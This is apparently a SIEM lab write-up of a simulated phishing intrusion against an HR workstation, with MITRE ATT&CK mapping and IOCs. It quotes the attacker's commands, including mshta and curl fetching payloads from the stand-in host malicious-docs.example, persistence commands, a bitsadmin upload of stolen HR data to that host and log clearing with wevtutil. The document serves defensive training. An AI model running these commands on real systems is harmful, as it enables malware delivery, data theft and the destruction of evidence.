# 📧 Investigation 14 – Phishing Email Malware Delivery & HR Data Exfiltration

## 📌 Scenario

An HR employee (`priya.shah`) received a phishing email containing a malicious Microsoft Word document (`Invoice_July_2026.docm`). After opening the attachment, embedded macros executed PowerShell and Windows utilities to download malware, establish persistence, communicate with a Command & Control (C2) server, collect sensitive HR documents, exfiltrate the data, and finally perform anti-forensics to hide attacker activity.

---

# 🎯 Investigation Objectives

- Investigate phishing email delivery
- Analyze malicious Office document execution
- Detect PowerShell abuse
- Investigate MSHTA execution
- Analyze malware download
- Detect Command & Control (C2) communication
- Identify persistence mechanisms
- Investigate HR data collection
- Analyze data staging & archive creation
- Detect data exfiltration
- Investigate anti-forensics activity
- Map attacker behavior to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **37** |
| Hostname | **WIN-HR02** |
| Target User | **priya.shah** |
| Attack Type | **Phishing Email → Malware → HR Data Exfiltration** |
| Incident Severity | 🔴 Critical |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
| 4624 | Successful Logon | 3 |
| 4625 | Failed Logon | 1 |
| 4634 | Logoff | 1 |
| 4663 | Object Access | 3 |
| 4688 | Process Creation | 24 |
| 4698 | Scheduled Task Created | 1 |
| 5156 | Allowed Network Connection | 4 |

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
| 🔴 Critical | 8 |
| 🟠 High | 11 |
| 🟡 Medium | 10 |
| 🟢 Low | 8 |

---

# 👤 Most Active User

| User | Events |
|------|-------:|
| **priya.shah** | **Most Events** |

The HR employee became the victim after opening a malicious phishing attachment.

---

# 🔍 Investigation Findings

---

## Phase 1 – Initial Access

### Email Client

```text
outlook.exe
```

### Attachment

```text
Invoice_July_2026.docm
```

### Findings

The attacker delivered a phishing email containing a **macro-enabled Microsoft Word document (.docm)**. After the victim opened the attachment, malicious VBA macros initiated the infection chain.

---

## Phase 2 – Malware Execution

### Commands

```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile
```

```cmd
mshta.exe http://malicious-docs.example/update.hta
```

### Findings

PowerShell bypassed execution restrictions and launched `mshta.exe`, which executed a malicious HTA file to continue the attack while blending in with legitimate Windows utilities.

---

## Phase 3 – Payload Download

### Command

```cmd
curl.exe http://malicious-docs.example/hr_payload.exe -o C:\Users\Public\hr_payload.exe
```

### Findings

The attacker downloaded the malware (`hr_payload.exe`) into the Public directory and executed it.

---

## Phase 4 – System Reconnaissance

### Commands

```cmd
whoami /all
hostname
ipconfig /all
netstat -ano
tasklist
nslookup malicious-docs.example
```

### Purpose

The attacker collected:

- User information
- Hostname
- Network configuration
- Active network connections
- Running processes
- DNS resolution

---

## Phase 5 – Persistence

### Registry Run Key

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v HRUpdater /t REG_SZ /d C:\Users\Public\hr_payload.exe /f
```

### Scheduled Task

```cmd
schtasks /create /sc onlogon /tn HRUpdater /tr C:\Users\Public\hr_payload.exe
```

### Findings

The attacker established persistence using both a Registry Run Key and a Scheduled Task to ensure the malware automatically executes after user logon or system restart.

---

## Phase 6 – Command & Control (C2)

Multiple outbound network connections were observed between the infected host and the attacker-controlled infrastructure.

### Findings

The malware periodically communicated with the C2 server (beaconing), allowing the attacker to maintain remote control and issue additional commands.

---

## Phase 7 – HR Data Collection

### Command

```cmd
findstr /si "salary passport aadhaar pan" *.docx *.xlsx *.txt
```

### Findings

The attacker searched for sensitive HR documents containing:

- Salary information
- Passport details
- Aadhaar numbers
- PAN information

---

## Phase 8 – Data Staging

### Command

```cmd
robocopy Documents Public\hr_staging /E
```

### Findings

Identified HR files were copied into a staging directory before exfiltration.

---

## Phase 9 – Archive Creation

### Command

```cmd
7z.exe a C:\Users\Public\hr_archive.7z C:\Users\Public\hr_staging\*
```

### Findings

The attacker compressed collected files into a single archive to reduce upload size and simplify exfiltration.

---

## Phase 10 – Data Exfiltration

### Command

```cmd
bitsadmin /transfer hrexfil /upload /priority normal C:\Users\Public\hr_archive.7z http://malicious-docs.example/upload
```

### Findings

The archive was uploaded to an attacker-controlled server using `bitsadmin.exe`.

---

## Phase 11 – Cleanup

### Command

```cmd
cmd.exe /c del C:\Users\Public\hr_archive.7z
```

### Findings

The archive was deleted after successful exfiltration to remove evidence.

---

## Phase 12 – Anti-Forensics

### Command

```cmd
wevtutil cl Security
```

### Findings

Windows Security Event Logs were cleared to hinder forensic investigation and delay detection.

---

# 📈 Complete Attack Timeline

```text
Phishing Email Delivered
        │
Victim Opens Outlook
        │
Malicious .docm Attachment Opened
        │
VBA Macro Execution
        │
PowerShell (ExecutionPolicy Bypass)
        │
MSHTA Execution
        │
Payload Download (curl)
        │
Payload Execution
        │
System Reconnaissance
        │
Registry Persistence
        │
Scheduled Task Persistence
        │
Command & Control Beaconing
        │
Sensitive HR File Discovery
        │
Data Staging
        │
Archive Creation
        │
Data Exfiltration
        │
Delete Archive
        │
Clear Windows Security Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| Spearphishing Attachment | T1566.001 |
| User Execution | T1204.002 |
| PowerShell | T1059.001 |
| System Binary Proxy Execution (MSHTA) | T1218.005 |
| Ingress Tool Transfer | T1105 |
| System Owner/User Discovery | T1033 |
| System Information Discovery | T1082 |
| Network Configuration Discovery | T1016 |
| System Network Connections Discovery | T1049 |
| Registry Run Keys | T1547.001 |
| Scheduled Task | T1053.005 |
| Application Layer Protocol (C2) | T1071 |
| Data from Local System | T1005 |
| Local Data Staging | T1074.001 |
| Archive Collected Data | T1560.001 |
| Exfiltration Over Alternative Protocol | T1048 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Host

- WIN-HR02

## User

- priya.shah

## Suspicious Files

- Invoice_July_2026.docm
- update.hta
- hr_payload.exe
- hr_archive.7z
- Employee_Salary_List.xlsx
- Candidate_Documents.zip

## Suspicious Processes

- outlook.exe
- winword.exe
- powershell.exe
- mshta.exe
- curl.exe
- hr_payload.exe
- reg.exe
- schtasks.exe
- robocopy.exe
- 7z.exe
- bitsadmin.exe
- wevtutil.exe

## External Infrastructure

- malicious-docs.example
- 198.51.100.90

---

# 🚨 Incident Conclusion

The investigation revealed a successful phishing attack targeting an HR employee. A malicious macro-enabled Microsoft Word document initiated malware execution through PowerShell and MSHTA. The attacker downloaded a payload, established persistence, communicated with a Command & Control server, searched for sensitive HR documents, staged and compressed the data, exfiltrated it using BITSAdmin, and removed evidence by deleting archives and clearing Windows Security Event Logs.

**Final Incident Severity:** 🔴 **Critical**

---

# 🛠️ Skills Demonstrated

- Splunk SIEM Investigation
- Phishing Investigation
- Malware Analysis
- Windows Event Log Analysis
- PowerShell Investigation
- Living-off-the-Land Binary (LOLBin) Detection
- Command & Control Detection
- Threat Hunting
- Data Exfiltration Analysis
- Incident Response
- MITRE ATT&CK Mapping
- IOC Identification
- Anti-Forensics Investigation

---

## ⭐ Investigation Status

✅ Completed

**Difficulty:** ⭐⭐⭐⭐⭐ (Advanced Phishing & Malware Investigation)
